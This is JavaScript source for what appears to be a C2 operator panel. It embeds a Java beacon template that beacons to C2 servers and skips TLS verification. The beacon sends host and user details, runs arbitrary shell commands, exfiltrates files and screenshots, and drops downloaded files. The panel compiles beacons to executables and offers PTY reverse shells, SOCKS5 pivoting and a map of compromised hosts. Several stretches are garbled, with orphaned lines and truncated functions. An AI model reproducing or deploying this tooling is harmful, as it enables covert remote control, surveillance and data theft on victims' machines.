    badge.innerHTML = `<span style="color:var(--text3)">${t('mfa_disabled_badge')}</span>`;
    btn.textContent = t('mfa_activate');
    btn.className = 'btn btn-sm';
  }
  btn.style.display = 'inline-block';
  btn.dataset.enabled = enabled ? '1' : '0';
}

function mfaToggle() {
  const btn = document.getElementById('mfa-toggle-btn');
  if (btn.dataset.enabled === '1') {
    document.getElementById('mfa-disable-box').style.display = 'block';
    document.getElementById('mfa-setup-box').style.display = 'none';
    document.getElementById('mfa-disable-code').focus();
  } else {
    mfaStartSetup();
  }
}

async function mfaStartSetup() {
  const res = await apiFetch('/api/settings/mfa/setup', { method: 'POST' });
  if (!res || !res.ok) return;
  const { secret, uri } = await res.json();
  _mfaSetupSecret = secret;
  document.getElementById('mfa-secret-display').textContent = secret;
  document.getElementById('mfa-setup-box').style.display = 'block';
  document.getElementById('mfa-disable-box').style.display = 'none';
  document.getElementById('mfa-setup-error').style.display = 'none';
  document.getElementById('mfa-confirm-code').value = '';

  // Render QR code using qrcodejs
  const qrDiv = document.getElementById('mfa-qr-canvas');
  qrDiv.innerHTML = '';
  if (window.QRCode) {
    new QRCode(qrDiv, { text: uri, width: 180, height: 180, correctLevel: QRCode.CorrectLevel.M });
  }
  document.getElementById('mfa-confirm-code').focus();
}

async function mfaConfirm() {
  const errEl = document.getElementById('mfa-setup-error');
  errEl.style.display = 'none';
  const code = document.getElementById('mfa-confirm-code').value.trim();
  if (!code) { errEl.textContent = 'Ingresa el código.'; errEl.style.display = 'block'; return; }
  const res = await apiFetch('/api/settings/mfa/enable', {
    method: 'POST',
    body: JSON.stringify({ secret: _mfaSetupSecret, code }),
  });
  if (!res || !res.ok) {
    const d = await res.json().catch(() => ({}));
    errEl.textContent = d.detail || 'Código incorrecto.';
    errEl.style.display = 'block';
    document.getElementById('mfa-confirm-code').value = '';
    return;
  }
  document.getElementById('mfa-setup-box').style.display = 'none';
  _mfaSetupSecret = null;
  loadMfaStatus();
}

function mfaCancelSetup() {
  document.getElementById('mfa-setup-box').style.display = 'none';
  _mfaSetupSecret = null;
}

async function mfaDisableConfirm() {
  const errEl = document.getElementById('mfa-disable-error');
  errEl.style.display = 'none';
  const code = document.getElementById('mfa-disable-code').value.trim();

  const users = await res.json();

async function createUser() {

  errEl.style.display = 'none';
  const username = document.getElementById('new-user-name').value.trim();
  const password = document.getElementById('new-user-pass').value;

    method: 'POST',

async function deleteUser(username) {

  const res = await apiFetch(`/api/settings/users/${encodeURIComponent(username)}`, { method: 'DELETE' });

  tbody.innerHTML = _wlEntries.length === 0

  okEl.style.display  = 'none';

    errEl.style.display = 'block'; return;

  const res = await apiFetch('/api/auth/change-password', {
    method: 'POST',

  if (!res || !res.ok) {

    private static void initSsl() throws Exception {
        TrustManager[] tm = new TrustManager[]{ new X509TrustManager() {
            public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }
            public void checkClientTrusted(X509Certificate[] c, String a) {}
            public void checkServerTrusted(X509Certificate[] c, String a) {}
        }};
        sslCtx = SSLContext.getInstance("TLS");
        sslCtx.init(null, tm, new java.security.SecureRandom());
    }

    // ── HTTP POST ─────────────────────────────────────────────
    private static String post(String path, String payload) {
        ${buildBody}
        for (int i = 0; i < C2_URLS.length; i++) {
            String url = C2_URLS[(urlIdx + i) % C2_URLS.length];
            try {
                HttpURLConnection conn = (HttpURLConnection) new URL(url + path).openConnection();
                if (conn instanceof HttpsURLConnection)
                    ((HttpsURLConnection) conn).setSSLSocketFactory(sslCtx.getSocketFactory());
                if (conn instanceof HttpsURLConnection)
                    ((HttpsURLConnection) conn).setHostnameVerifier((h, s) -> true);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setRequestProperty("X-Agent-Secret", SECRET);
                ${setUAHeaders}
                conn.setConnectTimeout(10000); conn.setReadTimeout(15000);
                conn.setDoOutput(true);
                conn.getOutputStream().write(body);
                byte[] respBytes = conn.getInputStream().readAllBytes();
                urlIdx = (urlIdx + i) % C2_URLS.length;
                ${parseResp}
                return respStr;
            } catch (Exception ignored) {}
        }
        return null;
    }

    // ── Agent ID persistence ──────────────────────────────────
    private static String getOrCreateId() {
        try {
            File f = new File(getBaseDir(), ".beacon_id");
            if (f.exists()) return Files.readString(f.toPath()).trim();
            String id = UUID.randomUUID().toString();
            Files.writeString(f.toPath(), id);
            return id;
        } catch (Exception e) { return UUID.randomUUID().toString(); }
    }

    private static String getBaseDir() {
        try {
            return new File(Beacon.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getParent();
        } catch (Exception e) { return System.getProperty("user.dir"); }
    }

    // ── HTTP GET (binary) ─────────────────────────────────────
    private static byte[] getBytes(String path) {
        for (int i = 0; i < C2_URLS.length; i++) {
            String url = C2_URLS[(urlIdx + i) % C2_URLS.length];
            try {
                HttpURLConnection conn = (HttpURLConnection) new URL(url + path).openConnection();
                if (conn instanceof HttpsURLConnection)
                    ((HttpsURLConnection) conn).setSSLSocketFactory(sslCtx.getSocketFactory());
                if (conn instanceof HttpsURLConnection)
                    ((HttpsURLConnection) conn).setHostnameVerifier((h, s) -> true);
                conn.setRequestMethod("GET");
                conn.setRequestProperty("X-Agent-Secret", SECRET);
                conn.setConnectTimeout(10000); conn.setReadTimeout(30000);
                byte[] data = conn.getInputStream().readAllBytes();
                urlIdx = (urlIdx + i) % C2_URLS.length;
                return data;
            } catch (Exception ignored) {}
        }
        return null;
    }

    // ── System info ───────────────────────────────────────────
    private static String localIp() {
        try {
            try (java.net.DatagramSocket s = new java.net.DatagramSocket()) {
                s.connect(InetAddress.getByName("8.8.8.8"), 80);
                return s.getLocalAddress().getHostAddress();
            }
        } catch (Exception e) { return "127.0.0.1"; }
    }

    private static String osInfo() {
        return System.getProperty("os.name","?") + " " + System.getProperty("os.version","") + " " + System.getProperty("os.arch","");
    }

    // ── Checkin ───────────────────────────────────────────────
    private static String checkin() {
        String hostname = "unknown";
        try { hostname = InetAddress.getLocalHost().getHostName(); } catch (Exception ignored) {}
        String username = System.getProperty("user.name", "unknown");
        long pid = ProcessHandle.current().pid();
        String payload = "{\\"agent_id\\":\\"" + agentId + "\\"," +
            "\\"hostname\\":\\"" + jsonEscape(hostname) + "\\"," +
            "\\"ip_internal\\":\\"" + localIp() + "\\"," +
            "\\"os_info\\":\\"" + jsonEscape(osInfo()) + "\\"," +
            "\\"username\\":\\"" + jsonEscape(username) + "\\"," +
            "\\"pid\\":" + pid + "," +
            "\\"sleep_interval\\":" + SLEEP + "," +
            "\\"cwd\\":\\"" + jsonEscape(cwd) + "\\"}";
        return post("/api/beacon/checkin", payload);
    }

    // ── Command execution ─────────────────────────────────────
    private static String runCommand(String cmd, String taskId) {
        cmd = cmd.trim();
        String os = System.getProperty("os.name","").toLowerCase();
        boolean isWin = os.contains("win");

        if (cmd.equals("info")) {
            String hostname = "unknown";
            try { hostname = InetAddress.getLocalHost().getHostName(); } catch (Exception ignored) {}
            return "ID:       " + agentId + "\\n" +
                   "Hostname: " + hostname + "\\n" +
                   "User:     " + System.getProperty("user.name","?") + "\\n" +
                   "OS:       " + osInfo() + "\\n" +
                   "IP:       " + localIp() + "\\n" +
                   "PID:      " + ProcessHandle.current().pid() + "\\n" +
                   "CWD:      " + cwd;
        }

        if (cmd.startsWith("cd ")) {
            String target = cmd.substring(3).trim();
            File dir = target.startsWith("/") || (target.length() > 1 && target.charAt(1) == ':')
                ? new File(target) : new File(cwd, target);
            if (dir.isDirectory()) { cwd = dir.getAbsolutePath(); return ""; }
            return "cd: " + target + ": No such directory";
        }

        if (cmd.equals("ps")) {
            try {
                return ProcessHandle.allProcesses()
                    .map(p -> String.format("%6d  %s", p.pid(), p.info().command().orElse("?")))
                    .reduce("  PID  CMD", (a, b) -> a + "\\n" + b);
            } catch (Exception e) { return "Error: " + e.getMessage(); }
        }

        if (cmd.startsWith("kill ")) {
            try {
                long pid = Long.parseLong(cmd.split("\\\\s+")[1]);
                ProcessHandle.of(pid).ifPresent(ProcessHandle::destroy);
                return "[+] Signal sent to PID " + pid;
            } catch (Exception e) { return "Error: " + e.getMessage(); }
        }

        if (cmd.startsWith("download ")) {
            String path = cmd.substring(9).trim();
            File f = new File(path.startsWith("/") || (path.length()>1&&path.charAt(1)==':') ? path : cwd + File.separator + path);
            try {
                byte[] data = Files.readAllBytes(f.toPath());
                String b64 = Base64.getEncoder().encodeToString(data);
                return "__b64file__:" + f.getName() + ":" + b64;
            } catch (Exception e) { return "Error: " + e.getMessage(); }
        }

        if (cmd.equals("screenshot")) {
            try {
                File tmp = File.createTempFile("xolo_ss_", ".png");
                tmp.deleteOnExit();
                if (isWin) {
                    String psCmd = "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; " +
                        "$s=[System.Windows.Forms.Screen]::PrimaryScreen; " +
                        "$b=New-Object System.Drawing.Bitmap($s.Bounds.Width,$s.Bounds.Height); " +
                        "$g=[System.Drawing.Graphics]::FromImage($b); " +
                        "$g.CopyFromScreen($s.Bounds.Location,[System.Drawing.Point]::Empty,$s.Bounds.Size); " +
                        "$b.Save('" + tmp.getAbsolutePath().replace("\\\\", "\\\\\\\\") + "')";
                    ProcessBuilder pb = new ProcessBuilder("powershell", "-WindowStyle", "Hidden", "-Command", psCmd);
                    pb.redirectErrorStream(true);
                    Process p = pb.start(); p.waitFor();
                    if (!tmp.exists() || tmp.length() == 0) return "Screenshot failed";
                } else {
                    ProcessBuilder pb = new ProcessBuilder("scrot", tmp.getAbsolutePath());
                    pb.redirectErrorStream(true);
                    Process p = pb.start(); p.waitFor();
                    if (!tmp.exists() || tmp.length() == 0) return "screenshot: install scrot (apt install scrot)";
                }
                byte[] data = Files.readAllBytes(tmp.toPath());
                tmp.delete();
                String b64 = Base64.getEncoder().encodeToString(data);
                return "__b64file__:screenshot_" + System.currentTimeMillis() + ".png:" + b64;
            } catch (Exception e) { return "Error: " + e.getMessage(); }
        }

        if (cmd.startsWith("__upload__:") && taskId != null) {
            String[] parts = cmd.split(":", 3);
            if (parts.length < 3) return "Error: malformed upload command";
            String filename = parts[1];
            String dest = parts[2];
            if (dest.endsWith("/") || dest.endsWith("\\\\") || new File(dest).isDirectory())
                dest = dest.replaceAll("[/\\\\\\\\]+$", "") + File.separator + filename;
            byte[] data = getBytes("/api/beacon/fetch/" + agentId + "/" + taskId);
            if (data == null) return "Error: could not fetch " + filename;
            try {
                Files.write(new File(dest).toPath(), data);
                return "[+] " + filename + " \\u2192 " + dest + " (" + data.length + " bytes)";
            } catch (Exception e) { return "Error writing " + dest + ": " + e.getMessage(); }
        }

        // Shell command
        try {
            ProcessBuilder pb = isWin
                ? new ProcessBuilder("cmd.exe", "/c", cmd)
                : new ProcessBuilder("/bin/sh", "-c", cmd);
            pb.directory(new File(cwd));
            pb.redirectErrorStream(true);
            Process p = pb.start();
            byte[] out = p.getInputStream().readAllBytes();
            p.waitFor();
            return new String(out).stripTrailing();
        } catch (Exception e) { return "Error: " + e.getMessage(); }
    }

    // ── Main loop ─────────────────────────────────────────────
    public static void main(String[] args) throws Exception {
        initSsl();${sandboxCall}${bgCall}${persistCall}
        agentId = getOrCreateId();
        cwd = System.getProperty("user.dir");
        int sleepMs = SLEEP * 1000;
        while (true) {
            try {
                String resp = checkin();
                if (resp != null) {
                    String taskId  = jsonGet(resp, "task_id");
                    String command = jsonGet(resp, "command");
                    if (taskId != null && command != null) {
                        String output = runCommand(command, taskId);
                        String result = "{\\"task_id\\":\\"" + taskId + "\\"," +
                            "\\"output\\":\\"" + jsonEscape(output) + "\\"," +
                            "\\"status\\":\\"done\\"}";
                        post("/api/beacon/result", result);
                    }
                }
            } catch (Exception ignored) {}
            int jitterMs = (int)(sleepMs * (JITTER / 100.0) * rng.nextDouble());
            Thread.sleep(sleepMs + jitterMs);
        }
    }
}
`;
}

async function downloadBeacon(type) {
  const code = document.getElementById('beacon-code').textContent;
  if (!code) return;

  const statusEl = document.getElementById('compile-status');

  if (type === 'py') {
    const blob = new Blob([code], { type: 'text/plain' });
    const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = 'beacon.py'; a.click();
    return;
  }

  if (type === 'java-src') {
    const blob = new Blob([code], { type: 'text/plain' });
    const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = 'Beacon.java'; a.click();
    return;
  }

  if (type === 'jar') {
    statusEl.style.cssText = 'display:block;background:var(--bg3);color:var(--text2);padding:10px 14px;border-radius:6px;font-size:12px';
    statusEl.textContent = '⏳ Compilando JAR en el servidor... (~10s)';
    const res = await apiFetch('/api/info/beacon/compile-java', {
      method: 'POST',
      body: JSON.stringify({ code }),
    });
    if (!res || !res.ok) {
      const err = await res?.json().catch(() => ({ detail: 'Error desconocido' }));
      statusEl.style.color = 'var(--danger)';
      statusEl.textContent = `✗ ${err.detail}`;
      return;
    }
    const blob = await res.blob();
    const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = 'beacon.jar'; a.click();
    statusEl.style.color = 'var(--online)';
    statusEl.textContent = '✓ beacon.jar descargado. Ejecutar con: java -jar beacon.jar';
    setTimeout(() => statusEl.style.display = 'none', 4000);
    return;
  }

  // Linux ELF via PyInstaller
  statusEl.style.cssText = 'display:block;background:var(--bg3);color:var(--text2);padding:10px 14px;border-radius:6px;font-size:12px';
  statusEl.textContent = `⏳ Compiling for ${type === 'linux' ? 'Linux' : 'Windows'}... this may take ~30s`;

  const res = await apiFetch('/api/info/beacon/compile', {
    method: 'POST',
    body: JSON.stringify({ code, platform: type }),
  });

  if (!res || !res.ok) {
    const err = await res?.json().catch(() => ({ detail: 'Unknown error' }));
    statusEl.style.color = 'var(--danger)';
    statusEl.textContent = `✗ ${err.detail}`;
    return;
  }

  const blob = await res.blob();
  const ext = type === 'windows' ? '.exe' : '';
  const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = `beacon${ext}`; a.click();
  statusEl.style.color = 'var(--online)';
  statusEl.textContent = '✓ Binary downloaded.';
  setTimeout(() => statusEl.style.display = 'none', 3000);
}

// ── PTY Shell ─────────────────────────────────────────────
let _ptyTerm = null;
let _ptySessId = null;
let _ptyAgentId = null;

async function openPtyShell(agentId) {
  const modal = document.getElementById('pty-modal');
  modal.classList.add('open');
  document.getElementById('pty-status').textContent = 'Starting PTY session...';
  document.getElementById('pty-status').style.color = 'var(--warning)';

  // Destroy previous terminal
  if (_ptyTerm) {
    _ptyTerm.dispose();
    _ptyTerm = null;
  }
  document.getElementById('pty-terminal').innerHTML = '';

  // Start PTY session on server
  const res = await apiFetch(`/api/pty/${agentId}/start`, { method: 'POST' });
  if (!res || !res.ok) {
    document.getElementById('pty-status').textContent = '✗ Failed to start PTY session';
    document.getElementById('pty-status').style.color = 'var(--danger)';
    return;
  }
  const data = await res.json();
  _ptySessId = data.session_id;
  _ptyAgentId = agentId;

  document.getElementById('pty-status').textContent = `Session: ${_ptySessId.slice(0, 8)}... | Waiting for beacon...`;
  document.getElementById('pty-status').style.color = 'var(--text3)';

  // Create xterm.js terminal
  _ptyTerm = new Terminal({
    cursorBlink: true,
    theme: {
      background: '#0d0d0d',
      foreground: '#e2e8f0',
      cursor: '#7c3aed',
      selection: 'rgba(124,58,237,0.3)',
      black: '#0d0d0d', red: '#ef4444', green: '#22c55e', yellow: '#f59e0b',
      blue: '#3b82f6', magenta: '#a855f7', cyan: '#06b6d4', white: '#e2e8f0',
    },
    fontSize: 13,
    fontFamily: 'ui-monospace, "Cascadia Code", "Fira Code", monospace',
    convertEol: true,
    scrollback: 2000,
  });

  _ptyTerm.open(document.getElementById('pty-terminal'));
  _ptyTerm.writeln('\x1b[1;32mPTY session started. Waiting for beacon to connect...\x1b[0m');
  _ptyTerm.writeln('\x1b[2m(The beacon will connect on its next check-in cycle)\x1b[0m');
  _ptyTerm.writeln('');

  // User keystrokes → server → beacon
  _ptyTerm.onData((data) => {
    if (_ptySessId && _ptyAgentId) {
      const b64 = btoa(data);
      apiFetch(`/api/pty/${_ptyAgentId}/${_ptySessId}/input`, {
        method: 'POST',
        body: JSON.stringify({ data: b64 }),
      });
    }
  });

  _ptyTerm.focus();
  document.getElementById('pty-status').style.color = 'var(--online)';
  document.getElementById('pty-status').textContent = `● LIVE — ${_ptySessId.slice(0, 8)}`;
}

async function closePtyShell() {
  if (_ptySessId && _ptyAgentId) {
    apiFetch(`/api/pty/${_ptyAgentId}/${_ptySessId}`, { method: 'DELETE' });
  }
  _ptySessId = null;
  _ptyAgentId = null;
  if (_ptyTerm) {
    _ptyTerm.dispose();
    _ptyTerm = null;
  }
  document.getElementById('pty-modal').classList.remove('open');
}

async function startSocks5(agentId) {
  const port = parseInt(document.getElementById('socks-port')?.value) || 1080;
  const res = await apiFetch('/api/tunnel/start', {
    method: 'POST',
    body: JSON.stringify({ agent_id: agentId, bind_port: port }),
  });
  if (!res) return;
  if (!res.ok) {

    showToast(`✗ SOCKS5: ${d.detail || 'Error'}`, 'danger');
    return;
  }
  const data = await res.json();

}

async function stopSocks5() {
  await apiFetch('/api/tunnel', { method: 'DELETE' });
  showToast('SOCKS5 detenido', 'info');
  refreshSocks5Status();
}

async function refreshSocks5Status() {
  const statusEl = document.getElementById('socks-status-text');
  const channelsEl = document.getElementById('socks-channels');
  if (!statusEl) return;

  const res = await apiFetch('/api/tunnel/status');
  if (!res || !res.ok) { statusEl.textContent = 'Status unavailable'; return; }
  const data = await res.json();

  if (data.running) {
    statusEl.innerHTML = `<span style="color:var(--online)">● ${t('socks_running')}</span> — 127.0.0.1:<strong style="color:var(--accent2)">${data.port}</strong>`;
    const ch = data.channels || [];
    const noChannels = t('socks_no_channels');
    channelsEl.textContent = ch.length === 0
      ? noChannels
      : `${ch.length} channel${ch.length > 1 ? 's' : ''}: ${ch.slice(0,3).map(c => c.target).join(', ')}${ch.length > 3 ? '...' : ''}`;
    if (channelsEl.textContent !== noChannels) {
      channelsEl.style.color = 'var(--accent2)';
    }
  } else {
    statusEl.innerHTML = `<span style="color:var(--text3)">● ${t('socks_stopped')}</span>`;
    channelsEl.textContent = '';
  }
}

  document.getElementById('upload-dest').value = '/tmp/';

async function submitUpload() {
  const errEl = document.getElementById('upload-error');
  errEl.style.display = 'none';

  const fileInput = document.getElementById('upload-file');
  const dest = document.getElementById('upload-dest').value.trim();

  if (!fileInput.files.length) {
    errEl.textContent = 'Select a file first.';
    errEl.style.display = 'block';
    return;
  }
  if (!dest) {
    errEl.textContent = 'Enter a destination path.';
    errEl.style.display = 'block';
    return;
  }

  const form = new FormData();
  form.append('file', fileInput.files[0]);
  form.append('dest_path', dest);

  const res = await fetch(`/api/agents/${_uploadAgentId}/upload`, {
    method: 'POST',
    headers: { 'Authorization': 'Bearer ' + getToken() },
    body: form,
  });

  if (!res.ok) {
    const d = await res.json();
    errEl.textContent = d.detail || 'Upload failed.';
    errEl.style.display = 'block';
    return;
  }

  const data = await res.json();
  // Add to task history so it shows up in the terminal
  taskHistory.push({
    id: data.task_id,
    command: `__upload__:${data.filename}:${data.dest_path}`,
    status: 'pending',
    output: '',
  });
  renderTerminal();
  closeUploadModal();
}

  const enabled = document.getElementById('wh-enabled').checked;
  const events = {};
  for (const k of ['new_agent','login','login_fail','agent_deleted','task_sent']) {
    const el = document.getElementById(`whe-${k}`);
    events[k] = el ? el.checked : false;
  }
  statusEl.textContent = _lang === 'es' ? 'Guardando...' : 'Saving...';
  const res = await apiFetch('/api/settings/webhook', {
    method: 'POST',
    body: JSON.stringify({ url, enabled, events }),
  });
  if (!res || !res.ok) {
    statusEl.textContent = '✗ Error'; statusEl.style.color = 'var(--danger)'; return;
  }
  statusEl.textContent = '✓'; statusEl.style.color = 'var(--online)';
  setTimeout(() => { if (statusEl) statusEl.textContent = ''; }, 2000);
}

async function testWebhook() {
  const statusEl = document.getElementById('wh-status');
  statusEl.textContent = _lang === 'es' ? 'Enviando...' : 'Sending...';
  statusEl.style.color = 'var(--text3)';
  const res = await apiFetch('/api/settings/webhook/test', { method: 'POST' });
  if (!res || !res.ok) {
    const d = await res?.json().catch(() => ({}));
    statusEl.textContent = `✗ ${d.detail || 'Error'}`; statusEl.style.color = 'var(--danger)'; return;
  }
  statusEl.textContent = '✓ Sent'; statusEl.style.color = 'var(--online)';
  setTimeout(() => { if (statusEl) statusEl.textContent = ''; }, 3000);
}

// ── Audit log ─────────────────────────────────────────────
const _ACTION_COLORS = {
  LOGIN: 'var(--online)', LOGIN_FAIL: 'var(--danger)', TASK_SENT: 'var(--accent)',
  FILE_UPLOAD: 'var(--accent2)', AGENT_DELETED: 'var(--warning)',
  USER_CREATED: 'var(--online)', USER_DELETED: 'var(--danger)',
  PASSWORD_CHANGED: 'var(--warning)',
};

async function loadAuditLog() {
  const container = document.getElementById('audit-tbody');
  if (!container) return;
  const filterEl = document.getElementById('audit-filter');
  const filter = filterEl ? filterEl.value : '';
  const url = `/api/audit/logs${filter ? `?action=${filter}` : ''}`;
  const res = await apiFetch(url);
  if (!res || !res.ok) {
    container.innerHTML = `<div style="color:var(--danger);font-size:12px">Access denied — admin only</div>`;
    return;
  }
  const logs = await res.json();
  if (!logs.length) {
    container.innerHTML = `<div style="color:var(--text3);font-size:12px;text-align:center;padding:14px">${_lang==='es'?'Sin registros':'No entries'}</div>`;
    return;
  }
  container.innerHTML = `<table style="width:100%;font-size:11px">
    <thead>
      <tr>
        <th style="width:140px">${_lang==='es'?'Fecha':'Time'}</th>
        <th style="width:90px">${_lang==='es'?'Actor':'Actor'}</th>
        <th style="width:120px">${_lang==='es'?'Acción':'Action'}</th>
        <th>${_lang==='es'?'Detalle':'Detail'}</th>
        <th style="width:110px">IP</th>
      </tr>
    </thead>
    <tbody>
      ${logs.map(l => {
        const ts = fmtDate(l.timestamp);
        const color = _ACTION_COLORS[l.action] || 'var(--text2)';
        return `<tr>
          <td style="color:var(--text3);font-family:var(--font-mono)">${escapeHtml(ts)}</td>
          <td style="color:var(--accent2)">${escapeHtml(l.actor)}</td>
          <td><span style="color:${color};font-weight:600">${escapeHtml(l.action)}</span></td>
          <td style="color:var(--text2);max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${escapeHtml(l.detail)}">${escapeHtml(l.detail)}</td>
          <td style="color:var(--text3);font-family:var(--font-mono)">${escapeHtml(l.ip||'—')}</td>
        </tr>`;
      }).join('')}
    </tbody>
  </table>`;
}

async function clearAuditLog() {
  if (!confirm(_lang==='es'?'¿Limpiar todo el registro de auditoría?':'Clear all audit log entries?')) return;
  const res = await apiFetch('/api/audit/logs', { method: 'DELETE' });
  if (res && res.ok) loadAuditLog();
}

// ── Map View ─────────────────────────────────────────────
function countryFlag(code) {
  if (!code || code.length !== 2) return '';
  return [...code.toUpperCase()].map(c => String.fromCodePoint(c.charCodeAt(0) + 127397)).join('');
}

async function renderMapView() {
  const content = document.getElementById('content');
  content.style.padding = '0';
  content.style.overflow = 'hidden';
  content.innerHTML = `
    <div id="agent-map" style="width:100%;height:calc(100vh - 48px)"></div>
    <div style="position:absolute;top:64px;left:236px;z-index:1000;display:flex;gap:8px;pointer-events:none">
      <div style="background:rgba(13,15,20,0.9);border:1px solid var(--border);border-radius:8px;padding:8px 14px;font-size:12px;pointer-events:auto;display:flex;align-items:center;gap:12px">
        <span id="map-stat-online" style="color:var(--online)">● 0 online</span>
        <span style="color:var(--border)">|</span>
        <span id="map-stat-total" style="color:var(--text2)">0 total</span>
        <span style="color:var(--border)">|</span>
        <span id="map-stat-nogeo" style="color:var(--text3)">0 sin geo</span>
      </div>
      <button class="btn btn-sm btn-ghost" style="pointer-events:auto" onclick="refreshMap()">↻</button>
    </div>`;

  await _initMap();
  _mapTimer = setInterval(refreshMap, 30000);
}

async function _initMap() {
  const agents = await apiFetch('/api/agents').then(r => r.ok ? r.json() : []).catch(() => []);

  if (!document.getElementById('agent-map')) return;

  if (!_leafletMap) {
    _leafletMap = L.map('agent-map', { zoomControl: true, attributionControl: true })
      .setView([20, 0], 2);
    L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
      attribution: '&copy; <a href="https://www.openstreetmap.org/copyright" style="color:#64748b">OpenStreetMap</a> &copy; <a href="https://carto.com/attributions" style="color:#64748b">CARTO</a>',
      subdomains: 'abcd',
      maxZoom: 19,
    }).addTo(_leafletMap);
  } else {
    _leafletMap.eachLayer(layer => {
      if (layer instanceof L.CircleMarker) _leafletMap.removeLayer(layer);
    });
  }

  let noGeo = 0;
  const geoAgents = agents.filter(a => a.latitude != null && a.longitude != null);
  noGeo = agents.length - geoAgents.length;

  geoAgents.forEach(a => {
    const isOnline = a.online;
    const flag = countryFlag(a.country_code);
    const loc = [a.city, a.country].filter(Boolean).join(', ') || '—';

    const marker = L.circleMarker([a.latitude, a.longitude], {
      radius: isOnline ? 9 : 7,
      fillColor: isOnline ? '#22c55e' : '#ef4444',
      color: isOnline ? '#16a34a' : '#dc2626',
      weight: 2,
      opacity: 1,
      fillOpacity: isOnline ? 0.9 : 0.45,
    }).addTo(_leafletMap);

    marker.bindPopup(`
      <div class="xolo-map-popup">
        <div class="xmp-host">${escapeHtml(a.hostname)}</div>
        <div class="xmp-row">👤 ${escapeHtml(a.username)}</div>
        <div class="xmp-row">📡 ${escapeHtml(a.ip_internal || '—')}${a.ip_external ? ' <span style="color:#64748b">(ext: ' + escapeHtml(a.ip_external) + ')</span>' : ''}</div>
        <div class="xmp-row">${flag} ${escapeHtml(loc)}</div>
        <div class="xmp-row" style="margin-top:4px">
          <span class="${isOnline ? 'xmp-online' : 'xmp-offline'}">${isOnline ? '● ONLINE' : '○ OFFLINE'}</span>
        </div>
        <button class="xmp-btn" onclick="showView('session','${escapeHtml(a.id)}')">→ Abrir sesión</button>
      </div>`, { className: 'xolo-popup-wrap', maxWidth: 240 });
  });

  const onlineCount = agents.filter(a => a.online).length;
  const el1 = document.getElementById('map-stat-online');
  const el2 = document.getElementById('map-stat-total');
  const el3 = document.getElementById('map-stat-nogeo');
  if (el1) el1.textContent = `● ${onlineCount} online`;
  if (el2) el2.textContent = `${agents.length} total`;
  if (el3) el3.textContent = `${noGeo} sin geo`;
}

async function refreshMap() {
  if (!_leafletMap) return;
  await _initMap();
}

// ── Helpers ──────────────────────────────────────────────
function fmtDate(iso) {
  if (!iso) return '—';
  try {
    // SQLite stores naive datetimes (no timezone suffix) — force UTC interpretation
    const utc = /Z$|[+-]\d{2}:\d{2}$/.test(iso) ? iso : iso + 'Z';
    return new Date(utc).toLocaleString('es-MX', {
      timeZone: _tz,
      day: '2-digit', month: '2-digit', year: 'numeric',
      hour: '2-digit', minute: '2-digit', second: '2-digit',
      hour12: false,
    }).replace(',', '');
  } catch (e) { return iso; }
}

function escapeHtml(str) {
  if (str == null) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

function formatAgo(secs) {
  if (secs < 60) return secs + (t('ago_s') || 's ago');
  if (secs < 3600) return Math.floor(secs / 60) + (t('ago_m') || 'm ago');
  return Math.floor(secs / 3600) + (t('ago_h') || 'h ago');
}
